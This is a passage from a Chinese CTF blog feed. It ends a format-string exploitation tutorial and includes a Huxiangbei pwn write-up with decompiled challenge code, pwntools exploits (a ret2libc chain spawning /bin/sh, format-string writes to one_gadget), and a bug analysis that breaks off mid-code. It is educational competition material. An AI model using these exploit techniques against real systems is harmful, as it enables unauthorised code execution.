number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%22$hhn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>onegadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%59$hhn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">,</span> <span class="token string">'wllmmllw'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x3d0d3 execve("/bin/sh", esp+0x34, environ)constraints:  esi is the GOT address of libc  [esp+0x34] == NULL0x3d0d5 execve("/bin/sh", esp+0x38, environ)constraints:  esi is the GOT address of libc  [esp+0x38] == NULL0x3d0d9 execve("/bin/sh", esp+0x3c, environ)constraints:  esi is the GOT address of libc  [esp+0x3c] == NULL0x3d0e0 execve("/bin/sh", esp+0x40, environ)constraints:  esi is the GOT address of libc  [esp+0x40] == NULL0x67a7f execl("/bin/sh", eax)constraints:  esi is the GOT address of libc  eax == NULL0x67a80 execl("/bin/sh", [esp])constraints:  esi is the GOT address of libc  [esp] == NULL0x137e5e execl("/bin/sh", eax)constraints:  ebx is the GOT address of libc  eax == NULL0x137e5f execl("/bin/sh", [esp])constraints:  ebx is the GOT address of libc  [esp] == NULL'''</span></code></pre><h2 id="0x7-总结"><a href="#0x7-总结" class="headerlink" title="0x7.总结"></a>0x7.总结</h2><p>总的来说，栈上的格式化字符串漏洞，可以直接写地址修改，缓冲区长度够的话就一次写一字节，长度不够就一次两字节写；bss段的格式化字符串，需要在栈中找栈链，栈0-&gt;栈1-&gt;栈2-&gt;值，然后修改栈2指向printf函数的返回地址或者main函数的地址，然后就可以修改返回地址为onegadget了；还有堆中的格式化字符串，实际上和bss段的没有区别，也是改栈链；如果程序只有有限次printf机会，如果有fini_array的真实地址，就可以修改fini_array中的值为mian函数的地址，以此来重复利用；标准输出流stdout被关闭了依然可以写数据，只不过没有回显了，想要重新输出的话可以将stdout结构体的fileno成员设置为2或者0，也可以通过修改stderr的值为onegadget来getshell。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直对格式化字符串的利用不是很上手，所以决定做个总结，复现一些骚题目还有一些常规题，bss段的格式化字符串和正常的栈上的格式化字符串利用，希望通过这次总结能加深对格式化字符串利用的理解。&lt;/p&gt;
&lt;h2 id=&quot;0x1-ha1cyon-ctf-level2&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯pwn题解</title>
    <link href="https://lawliet.ren/2020/11/02/hu-xiang-bei-pwn-ti-jie/"/>
    <id>https://lawliet.ren/2020/11/02/hu-xiang-bei-pwn-ti-jie/</id>
    <published>2020-11-02T11:50:15.000Z</published>
    <updated>2020-11-02T14:47:40.630Z</updated>
    
    <content type="html"><![CDATA[<p>上周末打了打湖湘杯，还是太菜了</p><h2 id="0x1-pwn1-pwn-printf"><a href="#0x1-pwn1-pwn-printf" class="headerlink" title="0x1.pwn1-pwn_printf"></a>0x1.pwn1-pwn_printf</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/1.jpg" alt=""></p><p>IDA分析</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/2.jpg" alt=""></p><p>打开的一瞬间确实有些裂开，不过仔细分析后其实不算难</p><p>程序的初始化完成之后会循环读入16个数值，然后通过sprtinf函数往<code>0x6000000</code>写入各个变量的值</p><pre class=" language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What the f**k printf?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try to input something"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You will find this game very interesting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xE000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">0xFFFE</span> <span class="token operator">!=</span> format <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>      <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x6000000</span><span class="token punctuation">,</span>      format<span class="token punctuation">,</span>      v13<span class="token punctuation">,</span>      <span class="token number">0LL</span><span class="token punctuation">,</span>      <span class="token operator">&amp;</span>format<span class="token punctuation">,</span>      <span class="token number">0x6000000LL</span><span class="token punctuation">,</span>      <span class="token operator">*</span>v12<span class="token punctuation">,</span>      v12<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span>      v11<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v11<span class="token punctuation">,</span>      v10<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v10<span class="token punctuation">,</span>      v9<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v9<span class="token punctuation">,</span>      v8<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v8<span class="token punctuation">,</span>      v7<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v7<span class="token punctuation">,</span>      v6<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v6<span class="token punctuation">,</span>      v5<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span>      v4<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>v16<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v12 <span class="token operator">&lt;=</span> <span class="token number">0x20u</span> <span class="token punctuation">)</span>    <span class="token function">sub_4007C6</span><span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please try again and you will get it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Sorry you are out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>注意到后面会判断<code>v12</code>的值是否小于等于<code>0x20</code>，如果成立则进入<code>sub_4007C6</code>这个函数，看看<code>sub_4007C6</code>函数</p><pre class=" language-c"><code class="language-c">ssize_t __fastcall <span class="token function">sub_4007C6</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp+0h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>savedregs<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>相当于一个后门函数，给了我们一个能够溢出的函数，而且输入直接从<code>rbp</code>开始，read函数能够读入的字节数为v12的值。</p><p>我们看看v12从何而来</p><pre class=" language-c"><code class="language-c">dest <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x4000000</span><span class="token punctuation">,</span> <span class="token number">0x4000000uLL</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>dest<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xE000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>程序在<code>0x4000000</code>处映射了一块内存，dest的值即为<code>0x4000000</code>，然后将<code>0x4000000</code>赋值给v12，循环读入的地址为<code>(char *)dest + 8 * i + 0xE000</code>，也就是<code>0x4000000+i*8+0xE000</code>,看起来没有地方能够修改v12的地方，但注意到</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/8.jpg" alt=""></p><p>v12是第9个参数</p><p>并且经过调试，在sprintf函数传参时，其参数也是我们scanf输入的地址</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/9.jpg" alt=""></p><p>因此可以确定v12是scanf输入的第9个数字，我们输入第九个数字为32，也就是进入后门函数的所能允许的最大数值</p><p>进入栈溢出之后就是常规的ret2libc了，通过puts泄露出libc地址，然后返回到后门函数，调用system(‘/bin/sh’)即可</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn_printf'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn_printf'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23_x64.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'You will find this game very interesting\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'32'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007c6</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>__libc_start_main_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>__libc_start_main_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x453a0</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x18ce17</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-pwn2-blend-pwn"><a href="#0x2-pwn2-blend-pwn" class="headerlink" title="0x2.pwn2-blend_pwn"></a>0x2.pwn2-blend_pwn</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/3.jpg" alt=""></p><p>保护全开，IDA分析</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token function">sub_DC0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_10E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">sub_EA2</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">dele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Quit successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">666</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"It must be a gift"</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"It must be a gift"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>LABEL_17<span class="token punctuation">:</span>        a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Your input seems to be wrong!"</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input seems to be wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Current user:"</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Current user:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_17<span class="token punctuation">;</span>      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>除了增删查改四个功能以外还有一个gift功能</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/4.jpg" alt=""></p><p>可以溢出到rbp，然后如果输入的数值长度超过0x10就会有一个C++的异常处理机制，抛出一个错误</p><p>再看到别的功能</p><h5 id="1-show-name"><a href="#1-show-name" class="headerlink" title="1.show_name"></a>1.show_name</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span>byte_202080<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在格式化字符串漏洞</p><p><code>0x202080</code>处的值来源于程序开头的一个函数</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_10E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter a name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read_str</span><span class="token punctuation">(</span>byte_202080<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>read_str</code>存在off-by-one，可以多输入一个字符</p><h5 id="2-new-note"><a href="#2-new-note" class="headerlink" title="2.new_note"></a>2.new_note</h5><pre class=" language-c"><code class="language-c">__int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020A0 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> dword_2020A0 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Insufficient space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v0 <span class="token operator">=</span> dword_2020A0<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> dword_2020A0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"down!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">++</span>dword_2020A0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>只能申请两次，然后分配一个0x60的chunk</p><h5 id="3-del-note"><a href="#3-del-note" class="headerlink" title="3.del_note"></a>3.del_note</h5><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">dele</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_EA2</span><span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Insufficient space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"down!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在uaf，但实际上无法利用，因为总共只能分配两个chunk，只能用来泄露堆地址</p><h5 id="4-show-note"><a href="#4-show-note" class="headerlink" title="4.show_note"></a>4.show_note</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token punctuation">)</span>      <span class="token function">LODWORD</span><span class="token 